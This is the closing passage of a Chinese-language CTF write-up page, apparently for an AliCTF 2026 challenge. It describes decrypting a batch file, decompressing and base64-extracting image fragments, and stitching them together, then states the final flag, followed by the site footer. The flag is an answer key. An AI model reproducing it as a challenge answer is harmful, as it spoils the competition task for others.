</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>work</span><span class=o>/</span><span class=n>batches</span><span class=o>/</span><span class=n>batch2_cipher</span><span class=p>.</span><span class=n>bin</span><span class=w> </span><span class=n>work</span><span class=o>/</span><span class=n>out</span><span class=o>/</span><span class=n>batch2_plain</span><span class=p>.</span><span class=n>bin</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>然后像 batch1/batch3 一样切片 + LZRR 解压 + 提取 base64，即可得到flag_part_2.jpg和flag_part_4.jpg</p><p>最后写个脚本拼起来得到完整图片：</p><p><img src=/img/2026-alictf/28.png alt=img></p><p>flag为：<code>alictf{5a8e0fb1-d3f5-4b13-8424-164faab9bbd2}</code></p><div class=blog-tags><a href=https://su-team.cn/tags/alictf/>alictf</a>&nbsp;</div></article><ul class="pager blog-pager"><li class=previous><a href=https://su-team.cn/post/rctf-2025-su-wu/ data-toggle=tooltip data-placement=top title="2025 RCTF SU WriteUp">&larr; Previous Post</a></li></ul></div></div></div><footer><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><ul class="list-inline text-center footer-links"><li><a href=https://ctftime.org/team/29641 title=CTFTime><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<img src=https://su-team.cn/img/ctftime.svg title=CTFTime alt=CTFTime style=width:60%;height:60%;position:absolute;top:20%;left:20%></span></a></li><li><a href=mailto:suers_xctf@126.com title="Email me"><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<i class="fas fa-envelope fa-stack-1x fa-inverse"></i></span></a></li><li><a href=https://github.com/team-su title=GitHub><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<i class="fab fa-github fa-stack-1x fa-inverse"></i></span></a></li></ul><p class="credits copyright text-muted"><a href=https://su-team.cn>SUer</a>
&nbsp;&bull;&nbsp;&copy;
2026
&nbsp;&bull;&nbsp;
<a href=https://su-team.cn/>su-team</a></p><p class="credits theme-by text-muted"><a href=https://gohugo.io>Hugo v0.148.2</a> powered &nbsp;&bull;&nbsp; Theme <a href=https://github.com/halogenica/beautifulhugo>Beautiful Hugo</a> adapted from <a href=https://deanattali.com/beautiful-jekyll/>Beautiful Jekyll</a></p></div></div></div></footer><script defer src=https://su-team.cn/js/katex.min.js></script><script defer src=https://su-team.cn/js/auto-render.min.js></script><script src=https://su-team.cn/js/jquery-3.7.0.slim.min.js></script><script src=https://su-team.cn/js/bootstrap.min.js></script><script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\begin{equation}",right:"\\end{equation}",display:!0},{left:"\\begin{align}",right:"\\end{align}",display:!0},{left:"\\begin{alignat}",right:"\\end{alignat}",display:!0},{left:"\\begin{gather}",right:"\\end{gather}",display:!0},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script><script src=https://su-team.cn/js/main.js></script><script src=https://su-team.cn/js/photoswipe.min.js></script><script src=https://su-team.cn/js/photoswipe-ui-default.min.js></script><script src=https://su-team.cn/js/load-photoswipe.js></script></body></html>